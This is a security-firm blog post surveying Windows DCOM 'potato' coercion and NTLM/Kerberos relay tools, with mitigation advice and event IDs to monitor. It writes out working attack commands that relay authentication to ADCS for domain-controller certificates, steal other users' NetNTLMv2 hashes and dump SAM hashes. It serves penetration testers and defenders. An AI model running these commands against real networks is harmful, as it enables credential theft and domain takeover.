# https://www.r-tec.net/r-tec-blog-windows-is-and-always-will-be-a-potatoland.html

[INCIDENT RESPONSE SERVICE](https://www.r-tec.net/# "INCIDENT RESPONSE SERVICE")

### Garantierte Reaktionszeiten.  Umfassende Vorbereitung.

Mit unserem Incident Response Service stellen wir sicher, dass Ihrem Unternehmen im Ernstfall die richtigen Ressourcen und Kompetenzen zur Verfügung stehen. Sie zahlen eine feste monatliche Pauschale und wir bieten Ihnen dafür einen Bereitschaftsdienst mit garantierten Annahme- und Reaktionszeiten. Durch einen im Vorfeld von uns erarbeiteten Maßnahmenplan sparen Sie im Ernstfall wertvolle Zeit.

[weiterlesen](https://www.r-tec.net/incident-response-service.html)

zurück

© Arif Wahid 266541 - Unsplash

[Copyright Informationen anzeigen](https://www.r-tec.net/# "Copyright Informationen anzeigen")

# Windows is and always will be a Potatoland

This blog post will dive into the world of some of the recently published potato techniques that can lead to more serious risks than "just" local Privilege Escalation.

May 7th 2025 Author: Nico Viakowski

## Introduction

2025 will somehow be the 10th anniversary of the [MS15-076](https://nvd.nist.gov/vuln/detail/CVE-2015-2370), which can pretty much be seen as the starting point of what I will refer to as the "Potatoland Windows".

From a penetration tester’s point of view, the technique behind this vulnerability is very valuable. It opened some doors for subsequent vulnerabilities that led to Privilege Escalation without being patched for years - the so-called "Potato"-techniques. In our team, we have often used them in both external and internal penetration tests. And as potatoes sprout quickly from the ground, there are likely to be more "Potato"-techniques in the future.

Whether you're a security researcher, a system administrator, or a penetration tester, understanding COM/DCOM abuse is critical to protecting Windows environments from advanced attack techniques. In this blog post, I'd like to dive into the world of some of the recently published potato techniques that can lead to more serious risks than "just" local Privilege Escalation. I’ll show how and more importantly when and which potato is the key to the kingdom, or at least to the next door. We will also take a look at what each tool requires and what system administrators can do to prevent these types of attacks in their environment.

This blog post stands on the shoulders of giants and does not contain any new research. It is more of a general overview of what’s still possible and valuable in 2025. The original sources can be found at the end of the blog post.

[1\. What is DCOM?](https://www.r-tec.net/#sprung1 "1. What is DCOM?")

[2\. What is it for?](https://www.r-tec.net/#sprung2 "2. What is it for?")

[3\. How does it actually work?](https://www.r-tec.net/#sprung3 "3. How does it actually work?")

[4\. What we can use it for?](https://www.r-tec.net/#sprung4 "4. What we can use it for?")

[5\. What are security researchers doing with it?](https://www.r-tec.net/#sprung5 "5. What are security researchers doing with it?")

[6\. ADCSCoercePotato](https://www.r-tec.net/#sprung6 "6. ADCSCoercePotato")

[7\. potato.py](https://www.r-tec.net/#sprung7 "7. potato.py")

[8\. RemotePotato0](https://www.r-tec.net/#sprung8 "8. RemotePotato0")

[9\. KrbRelay](https://www.r-tec.net/#sprung9 "9. KrbRelay")

[10\. RemoteKrbRelay](https://www.r-tec.net/#sprung10 "10. RemoteKrbRelay")

[11\. Mitigation](https://www.r-tec.net/#sprung11 "11. Mitigation")

[12\. Resources](https://www.r-tec.net/#sprung12 "12. Resources")

## 1\. What is DCOM?

The Distributed Component Object Model (DCOM) is a technology from Microsoft that allows applications to communicate across processes, computers, and networks. It works as an extension to the Component Object Model (COM) by allowing Remote Procedure Calls (RPC) over a network to create remote COM objects and call their methods. Overall, it allows applications to call methods on objects located on remote systems. It was originally developed for the Microsoft Office suite to exchange data between documents. DCOM and COM are pretty much the same, with the main difference being that COM is only available locally and DCOM can be used remotely over the network.

## 2\. What is it for?

By today's standards, DCOM is widely used in enterprise environments for a variety of reasons, including automation, application management, and remote administration. For example, the Microsoft Management Console (MMC) application uses DCOM to operate the Event Viewer or the Task Scheduler and most Office suite products also make use of it when remotely controlled. As mentioned above, DCOM is well established in the enterprise workspace and, not surprisingly, plays a key role in the software used by many organizations, such as Exchange, SQL Server and the Active Directory management tools. So DCOM can be found in just about every corner of an enterprise environment, trying to help administrators and applications with inter-process communication (IPC), making it irreplaceable when an organization wants to use automation, remote administration, or systems management.

## 3\. How does it actually work?

Now that we have a little bit of an understanding of what DCOM actually is and how it's used, let's take a look at how it works in the background.

As I don't want to waste too much of the reader's time, I won't explain the full technical aspects of DCOM and COM objects, but if you are interested or have never worked with DCOM before and want to dig deeper, I recommend the same video and blog post that I was referred to by [CICADA8-Research](https://github.com/CICADA8-Research) during my research:

[James Forshaw - COM in Sixty Seconds! (well minutes more likely)](https://www.youtube.com/watch?v=dfMuzAZRGm4)

[Playing around COM objects - PART 1](https://mohamed-fakroud.gitbook.io/red-teamings-dojo/windows-internals/playing-around-com-objects-part-1)

Let's go back to DCOM and the concept behind it. At its core, DCOM enables distributed components to communicate, allowing a client application to request and interact with a COM object, whether it is on the same machine or across a network. This request is first processed locally, where the local Service Control Manager (SCM) checks to see if the requested object is already running. If the requested COM object is on a remote machine, the request is actually redirected to the remote system’s SCM. How is it used coding wise?

When a client application initiates a request for a remote COM object, in most cases it will call the **CoCreateInstanceEx()** function for it. Within this function, it will specify the Class-Identifier ( **CLSID**), the remote server information ( **pServerInfo**), the context in which the objects will be executed ( **dwClsCtx**) and also, the interface through which the object can be retrieved ( **pResults**):

HRESULT CoCreateInstanceEx(

\[in\]      REFCLSID     Clsid,

\[in\]      IUnknown     \*punkOuter,

\[in\]      DWORD        dwClsCtx,

\[in\]      COSERVERINFO \*pServerInfo,

\[in\]      DWORD        dwCount,

\[in, out\] MULTI\_QI     \*pResults

);

The **CLSID** uniquely identifies each object so that the SCM can process the request. When a request is created, the local SCM checks to see if the object is already registered locally; if not, it contacts the remote SCM using **MSRPC** over **TCP/IP**. The SCM on the remote system identifies the required object via the Windows Registry, where the **CLSID** leads to an **AppID**, which is used to locate the appropriate COM server and for security checks. These checks determine if the client has the security permissions to activate the object ( **RemoteActivation**) and if the client is allowed to launch the object ( **RemoteLaunch**). If the permissions are valid, the remote SCM checks whether the requested object is already running or whether a new instance needs to be started. Launching a new instance means that the SCM launches a server application that hosts the COM object, making it available to the client. This can be a standalone **EXE** or a **DLL** that contains the functionality of the object. If the application is an **EXE** it starts a separate process, and if it is a DLL, it is loaded into an existing process. Into the process of the corresponding client application, that loads the DLL. The SCM then connects the client to the object and executes the desired method on the requested COM object. This is done using an Object Exporter ID (OXID), which gets registered by the remote COM server. The OXID helps the client to locate the remote system and can be resolved by the OXID Resolver service running within the Remote Procedure Call Subsystem (RPCSS). RPCSS runs the RPC Endpoint Mapper (EPM), which provides the client with all the necessary binding information, such as IP address, port, and network protocol. RPCSS pretty much coordinates the whole activation process on the client and server side and is also the key part for the security checks mentioned above.

At this point we have a remote object running and a client with all the information on how to connect to the object and able to start calling methods. The last steps would be to explain how the client interacts with the object, but let's keep this part as short as possible: Everything is done by marshalling method call arguments, packing them, sending them via MSRPC, unmarshalling them, calling the requested methods, executing them, and finally returning the response in the same way in reverse.

## 4\. What we can use it for?

As mentioned above, the EPM works with the OXID Resolver to provide the necessary information to the client that has requested a remote COM object. But why mention this again? Because it is possible to register a fake OXID Resolver, which several tools do. This allows an attacker to trick a COM object into performing NTLM or Kerberos authentication in the context of the COM object itself. This inbound authentication can lead to credential theft or can be abused for relaying purposes. If the COM object is running in the context of the SYSTEM user, the authentication is triggered by the computer account.

Another approach would be to find a local COM object that is allowed to work across user sessions and runs in the context of the logged-in user ( **INTERACTIVE**). James Forshaw has found a way to [manipulate the session ID](https://nvd.nist.gov/vuln/detail/CVE-2017-0298) by querying a specific interface onto an already created DCOM object. This allows us to attack users on a system to which we have been given low privileged interactive access. On multi-user systems, low privileged users can trigger the NTLM/Kerberos authentication of other users, which can be intercepted and redirected to a remote service, such as SMB via relaying. This technique is later described as Cross-Session-Authentication.

## 5\. What are security researchers doing with it?

Tools such as

[potato.py](https://github.com/sploutchy/impacket/blob/potato/examples/potato.py)

[RemotePotato0](https://github.com/antonioCoco/RemotePotato0)

[ADCSCoercePotato](https://github.com/decoder-it/ADCSCoercePotato)

[KrbRelay](https://github.com/cube0x0/KrbRelay) and

[RemoteKrbRelay](https://github.com/CICADA8-Research/RemoteKrbRelay)

demonstrate how to abuse the described DCOM misconfigurations, force DCOM activation for relaying attacks, or perform cross-session attacks to gain unauthorized access, execute remote code, and move laterally within networks.

In this section, we will take a closer look at these tools and how they work. The following graphic is pretty much the _TLDR_ version of the following section:

- Further explanation on ESC8 Prerequisites: [SpecterOps Certified Pre-Owned (PDF)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Windows_Potatoland/01_Tools-Overview.png)

Figure 01: Potato Technique Overview

## 6\. ADCSCoercePotato

Promoted with the sentence " _Yet another technique for coercing machine authentication but specific for ADCS server_". What else is there to say about this [tool](https://github.com/decoder-it/ADCSCoercePotato). Oh yes, it was developed by [Antonio Cocomazzi](https://github.com/antonioCoco) and [Andrea Pierini](https://github.com/decoder-it), another shout out to them. The same technique was in parallel published at Blackhat as [CertifiedDCOM (PDF)](https://i.blackhat.com/Asia-24/Presentations/Asia-24-Ding-CertifiedDCOM-The-Privilege-Escalation-Journey-to-Domain-Admin.pdf).

The tool takes advantage of the fact that any authenticated user can remotely activate the **CertSrv** DCOM application ( **CertSrv** **CLSID**: **D99E6E74-FC88-11D0-B498-00A0C90312F3**) from a target ADCS server (running as SYSTEM). This can be used to trigger a machine account authentication from the target ADCS server to a listener under the attacker's control in order to relay authentication for Privilege Escalation. In the original CertifiedDCOM talk, relaying to LDAP was possible, so that Privilege Escalation via Resource Based Constrained Delegation or Shadow Credential technique was possible. However, this was fixed by Microsoft and is not possible anymore.

By abusing the **Remote Activation** permission granted to regular domain users and forcing the authentication to a remote system controlled by the attacker - in combination with the ADCS web enrollment service being enabled -  it is ultimately possible to forge certificates for the PKI server itself. If the PKI server also acts as a domain controller, this gives us direct DCSync permissions, otherwise we can can take over the PKI server with a silver ticket once we have the certificate. In the very end, after relaying to LDAP got fixed, exploitation is equal and limited to ESC8 abuse. The only difference is the authentication trigger, so if Petitpotam/Coercer might fail (due to EDRs in place for example preventing this), triggering authentication via DCOM might still work.

### Prerequisites

- **Remote Activation** permission on the **CertSrv** DCOM application

  - By default enabled with these permissions
- ADCS server and a separate web enrollment server
  - Similar conditions required like ESC8
- NTLM authentication enabled
- Fake Remote OXID Resolver (e.g. Linux system within the environment)

### Attack Flow

1. Attacker uses **CoGetInstanceFromIStorage** to trigger ADCS Server authentication
2. ADCS server sends authenticated request to malicious OXID Resolver as **ADCSServer** $
3. Attacker forwards OXID Resolver authentication back to the attacker system
4. Victim ADCS Server sends final NTLM authentication to the attacker controlled system
5. [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) can forward the incoming NTLM authentication to the web enrollment endpoint to request a machine certificate

### Exploitation Example

On the attacker system:

- `socat TCP-LISTEN:135,reuseaddr,fork TCP:<TARGET-IP>:9999`

On a domain-joined system:

- `ADCSCoercePotato.exe -m <REMOTE-DCOM-SERVER/ADCS-SERVER> -k <IP-ADDRESS-SOCAT-REDIRECTOR> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -c D99E6E74-FC88-11D0-B498-00A0C90312F3`

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Windows_Potatoland/02_ADCSCoercePotato.png)

Figure 02: Initial Connection, CLSID Request and NTLM authentication process

Relay with ntlmrelayx.py to the ADCS Web enrollment Endpoint:

- `impacket-ntlmrelayx -t http://<ADCS-WEB-ENROLLMENT-IP/FQDN>/certsrv/certrqus.asp --adcs --template <TEMPALTE-NAME/machine> -smb2support`

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Windows_Potatoland/03_impacket-ntlmrelayx.png)

Figure 03: Receiving valid certificate

## 7\. potato.py

The [potato.py](https://github.com/sploutchy/impacket/blob/potato/examples/potato.py) script is already included in a fork of impacket. This script can trigger incoming NTLM authentications via DCOM. In my exemplary attack workflow, I am going to show the exploitation of CertifiedDCOM analogous to the previous example. This workflow is also described in the tool release [blog post](https://blog.compass-security.com/2024/09/three-headed-potato-dog/) itself. However, the script can also be used for any other generic DCOM authentication trigger instead of exploiting this specific misconfiguration.

Compared to the ADCSCoercePotato tool, it actually has the advantage that it does not need two tools but just one, which performs both OXID Resolver forwarding as well as the authentication trigger. On top, you do not need to execute an executable on a target system but can trigger the authentication fully remotely, so you do not need to care about AV/EDR detections for tools on disk or in memory. On the other side, it has the same limitation to NTLM as ADCSCoercePotato.

### Prerequisites

Successful exploitation for CertifiedDCOM requires low privileged user credentials but no access to a domain joined system. Obviously also the ability to run Python scripts, preferably via reverse socks or a Linux system in the target network. The target environment must have ADCS integrated for certificate management and the web enrollment endpoint must be enabled and being vulnerable to ESC8.

### Attack Flow

The attack workflow is the same as described in the previous chapter, as it is also the CertifiedDCOM attack just exploited with a different tool of choice. Screenshots and step-by-step guide can be found in the original publication blog post accordingly.

## 8\. RemotePotato0

This [tool](https://github.com/antonioCoco/RemotePotato0) can be used to trigger NTLM authentication of any other logged in user on the target system with interactive access via Cross-Session-Authentication such as described in the previous chapters. The interactive access permission is usually given when being logged in via RDP for example or WinRM/SSH. The exploit abuses the ability of a fake OXID Resolver to force a COM object to authenticate against it, to intercept and relay the NTLM authentication. Any COM servers configured with RunAs "Interactive User" can be used as target here.

It is very effective on servers in an enterprise environment as it can be used to obtain the NetNTLMv2 hash of users with an active session, after gaining low privileged access to the server. Particular terminal servers are very lucrative targets, as there is higher chances for multiple users with different privileges.

As stated in the README of the GitHub repository, the main way of the exploit with relaying to LDAP got [fixed](https://x.com/splinter_code/status/1583555613950255104). What many people don’t know, however, is that as an alternative it is still possible to relay to SMB (as shown below in the "Exploitation Example") or to a web enrollment endpoint of an ADCS server.

### Prerequisites

Successful exploitation requires a low privileged interactive logon to a domain-joined machine and another user session on that machine as a target. NTLM authentication must be available, also, security measures such as SMB signing and EPA should be disabled/not enforced. On top of that, the fake OXID Resolver is required for exploitation - which can be a Linux system inside the network or reverse port forwarding from a Command and Control perspective.

### Attack Flow

- Use **CoCreateInstanceFromIStorage** to create a COM Object to trigger authentication from an interactively logged on user and setting the IP address of the OXID Resolver to the IP of an attacker controlled system
- Call **QueryInterface** ( **ISpecialSystemProperties**) on the retrieved interface pointer (undocumented by Microsoft)
- Set the session ID of the target user using **SetSessionID** on the retrieved **SpecialSystemProperties** (undocumented by Microsoft)
- Call **StandardGetInstaceFromIStorage** on the interface pointer
- OXID resolving is done accordingly
- Incoming NTLM authentication can get intercepted or relayed

### Exploitation Example

- Relay NetNTLMv2 to SMB
  - very effective on e.g. terminal server where admin/domain admins are logged on
  - on the target system:


    - `RemotePotato.exe -m 2 -r <ATTACKER-IP> -x <ATTACKER-IP> -s <SESSION-ID> -c <CLSID DEPENDING ON OS>`
      - e.g. CLSID: 5167B42F-C111-47A1-ACC4-8EABE61B0B54
  - on attacker system:
    - `socat TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET-IP>:9999`

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Windows_Potatoland/04_socat%20TCP-LISTEN.png)

Figure 04: Stealing the NetNTLMv2 Hash of another logged in user

- Relaying NTLM to SMB to dump local hives on a remote system with local admin privileges
  - on target system:
    - `RemotePotato0.exe -m 0 -r <ATTACKER-IP> -x <ATTACKER-IP> -p 9999 -s <SESSION-ID> -c <CLSID>`
    - e.g. CLSID: F8842F8E-DAFE-4B37-9D38-4E0714A61149
  - on attacker system:
    - `socat TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET-IP>:9999`
    - ntlmrelayx.py -t <SECOND-TARGET-IP> -smb2support

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Windows_Potatoland/05_RemotePotato0_exe.png)

Figure 05: Trigger authentication for relaying

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Windows_Potatoland/06_ntlmrelayx_py.png)

Figure 06: Successfull relaying to SMB

## 9\. KrbRelay

The [KrbRelay](https://github.com/cube0x0/KrbRelay) tool can be used to relay incoming Kerberos authentication, which can for example be triggered via Cross-Session-authentication. The main goal is relaying Kerberos authentication requests to a remote target system similar to the workflow described with Remotepotat0 before, but via Kerberos.

Initially it was also possible to relay to LDAP for Resource-Based Constrained Delegation ( [RBCD](https://www.r-tec.net/r-tec-blog-resource-based-constrained-delegation.html)) or Shadow Credentials. Again, this was fixed and is not possible anymore. So most attack vectors from KrbRelay’s README are not abusable anymore.

Compared to the previous tools, it is to mention that this tool is like a one-shot for e.g. NetNTLMv2 hash retrieval or code execution as it doesn't require the setup of an OXID Resolver or the presence of a Linux system within the target environment. The possibility to relay Kerberos authentications also makes this attack vector more future-proof as NTLM authentication will likely die out. Using this tool, it is possible to capture NetNTLMv2 hashes, achieve remote code execution via SMB service creation or dumping remote system SAM database hashes, all builtin and C2-usable. The interactive file share access feature can also be used to access potential sensitive network shares of other users, e.g. their **$HOME** network shares which may contain their KeePass database or similar.

### Prerequisites

- Interactive initial access to a domain joined multi-user system
- Commonly targeted protocols: SMB without signing, HTTP without Channel binding or MSSQL
- Privileged Session on the target system

### Attack Flow

- Use of **CoCreateInstance** to create a COM Object for the target class
- Call **QueryInterface** ( **ISpecialSystemProperties**) on the retrieved interface pointer
- Set the Session ID using **SetSessionID** on the retrieved **SpecialSystemProperties**
- Call **StandardGetInstaceFromIStorage** on the interface pointer

  - Triggers authentication to a system defined by the attacker
- Once authenticated, the service ticket (TGS) can be relayed to the target system.

In essence, this is the same attack flow as Remotepotato0 with the difference that the malicious RPC server only accepts incoming Kerberos requests.

### Exploitation Example

- Cross-session attack:
  - `KrbRelay.exe -s <SESSION-ID> -clsid 354FF91B-5E49-4BDC-A8E6-1CB6C6877182 -ntlm`

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Windows_Potatoland/07_KrbRelay_exe_Cross-session-attack.png)

Figure 07: Retrieving the NetNTLMv2 Hash locally from another user

- Read out local SAM database hashes:
  - `KrbRelay.exe -cslid F8842F8E-DAFE-4B37-9D38-4E0714A61149 -session <TARGET-SESSION-ID> -spn cifs/<TARGET-SYSTEM>.<DOMAIN> -secrets`

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Windows_Potatoland/08_KrbRelay_exe_Read_out_local_SAM_database_hashes.png)

Figure 08: Relaying Kerberos to SMB for SAM NTLM Hash retrieval

- Relaying Kerberos to SMB for remote access:
  - `KrbRelay.exe -cslid f8842f8e-dafe-4b37-9d38-4e0714a61149 -session <SESSION-ID> -spn cifs/<TARGET-SYSTEM>.<DOMAIN> -console`

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Windows_Potatoland/09_KrbRelay_exe_Relaying_Kerberos_to_SMB_for_remote_access.png)

Figure 09: Relaying Kerberos to SMB for interactive file share access

## 10\. RemoteKrbRelay

The tool [RemoteKrbRelay](https://github.com/CICADA8-Research/RemoteKrbRelay) extends the functionality of KrbRelay by allowing remote relaying with DCOM. The goal is to use DCOM activation to force a target system to authenticate via Kerberos and forward that authentication to another service via relaying.

When executing RemoteKrbRelay in an interactive Session on a compromised system, it can be used the same way as KrbRelay locally. As with KrbRelay, this tool does not require an extra Linux system or Responder setup, it can be run entirely within a Windows environment.

However, it has builtin support for relaying to ADCS and DCOM, so that means we can use it to also abuse CertifiedDCOM – in the very end ESC8 – the easiest and most comfortable way. We can trigger authentication from a remote ADCS server with a low privileged user and can even relay this authentication back to the same system on HTTP, as it’s Kerberos and not NTLM. Therefore, this is a standalone tool that can be executed from a C2-Server via **execute-assembly** to exploit ESC8.

### Prerequisites

- A machine where we can run RemoteKrbRelay (any domain joined Windows system with network access).
  - There is no need for a Linux system within the network
- A reachable TCP port to receive authentication attempts
- A target system that allows remote DCOM authentication coercion
- ADCS within the target environment being vulnerable to ESC8 – even if only Kerberos/Negotiate authentication is enabled for HTTP

### Attack Flow

- Similar to ADCSCoercePotato/Potato.py for the ADCS authentication trigger
- The attacker sets up a rogue RPC server that listens for Kerberos authentication attempts.
- Kerberos authentication is relayed to the ADCS HTTP endpoint
- Retrieving a certificate for the PKI server or domain controller (if the DC is also PKI server similar to above)
  - Use the certificate for getting a Silver-Ticket or alternatively direct DCSync.

### Exploitation Example

- `RemoteKrbRelay.exe -adcs -template domaincontroller -target <FQDN-DC.DOMAIN.COM> -victim <FQDN-VICTIM.DOMAIN.COM> -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3`

![](https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Windows_Potatoland/10_RemoteKrbRelay_exe.png)

Figure 10: Triggering ADCS SYSTEM Kerberos authentication from DC01 and relaying to the same servers HTTP endpoint to get a ticket

## 11\. Mitigation

Microsoft does not really recognize these attack vectors. There are still some measures that have been released over the past few years to prevent such attacks.

One example is SMB Signing, which is enabled by default on domain controllers and Exchange servers. Enabling SMB Signing on all systems will help to prevent such attacks.

Similarly, LDAP Channel Binding is another notable measure, as it attempts to ensure that clients can only connect to legitimate servers. Another example is the RPC hardening measure, which means that relaying to LDAP is no longer possible and most of the attack vectors of the tools described fall away.

The exception is HTTP-based services, such as the ADCS web enrollment. In an effort to combat NTLM relaying attacks, Microsoft developed, implemented and released "Extended Protection for Authentication" (EPA) in 2009. This ensures that authentication requests actually come from the intended server, but can only help against relaying attacks using protocols such as SMB. To address this, administrators should enforce EPA on ADCS HTTP endpoints (or better yet, disable these endpoints altogether) and disable NTLM authentication for them.

In enterprise environments, it is feasible for organizations to move to Kerberos-only authentication and completely disable NTLM authentication to reduce the attack vectors for credential relaying. In fact, not only is it feasible, it is Microsoft's goal, as Windows 11 (24H2) and Windows Server 2025 recently dropped support for NTLM.

As the main attacks shown in this blog have focused on relaying authentication to SMB or ADCS HTTP, the most important mitigation is to enable SMB Signing on all Windows systems as well as enabling Channel Binding on the ADCS HTTP web enrollment endpoint – or disabling it completely if it’s not needed.

Another approach to tracking these attacks in an environment is to monitor the relevant Windows events:

[Event ID 4624](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624): An account was successfully logged on

[Event ID 4672](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672): Special privileges assigned to new logon

[Event ID 5145:](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=5145) A network share object was checked to see whether client can be granted desired access

[Event ID 4887](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4887) / [Event ID 4890](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4890): Certificate Services Approved A Certificate Request And Issued A Certificate

## 12\. Resources

[https://github.com/antonioCoco/RemotePotato0](https://github.com/antonioCoco/RemotePotato0)

[https://github.com/cube0x0/KrbRelay](https://github.com/cube0x0/KrbRelay)

[https://github.com/CICADA8-Research/RemoteKrbRelay](https://github.com/CICADA8-Research/RemoteKrbRelay)

[https://github.com/decoder-it/ADCSCoercePotato](https://github.com/decoder-it/ADCSCoercePotato)

[https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)

[https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html)

[https://blog.compass-security.com/2024/09/three-headed-potato-dog/](https://blog.compass-security.com/2024/09/three-headed-potato-dog/)

[https://www.youtube.com/watch?v=rPZx1zbKJnI](https://www.youtube.com/watch?v=rPZx1zbKJnI)

[https://troopers.de/downloads/troopers24/TR24\_10\_years\_of\_Windows\_Privilege\_Escalation\_with\_Potatoes\_CYZBJ3.pdf](https://troopers.de/downloads/troopers24/TR24_10_years_of_Windows_Privilege_Escalation_with_Potatoes_CYZBJ3.pdf)

[https://www.youtube.com/watch?v=dfMuzAZRGm4](https://www.youtube.com/watch?v=dfMuzAZRGm4)

[https://mohamed-fakroud.gitbook.io/red-teamings-dojo/windows-internals/playing-around-com-objects-part-1](https://mohamed-fakroud.gitbook.io/red-teamings-dojo/windows-internals/playing-around-com-objects-part-1)

[https://habr.com/ru/articles/848542/](https://habr.com/ru/articles/848542/)

[https://i.blackhat.com/Asia-24/Presentations/Asia-24-Ding-CertifiedDCOM-The-Privilege-Escalation-Journey-to-Domain-Admin.pdf](https://i.blackhat.com/Asia-24/Presentations/Asia-24-Ding-CertifiedDCOM-The-Privilege-Escalation-Journey-to-Domain-Admin.pdf)

[https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html](https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html)

[https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/](https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/)

## Warum r-tec?

- Technisch voraus, menschlich auf Augenhöhe
- Passgenaue Servicelösungen, kurze Reaktionszeiten, schnelle Terminierung, direkter Expertenkontakt
- Schnelle Hilfe im Angriffsfall
- ausgeprägte Service Struktur
- 25 Jahre Erfahrung in Konzeption, Aufbau und Betrieb von Cyber Security Lösungen
- ISO 9001 und ISO 27001 zertifiziert

### Kontaktieren   Sie uns!

Sie haben ein IT Security-Projekt, bei dem wir Sie unterstützen können? Wir beraten Sie gerne! Hier können Sie ein unverbindliches und kostenloses Erstgespräch vereinbaren.

Termin vereinbaren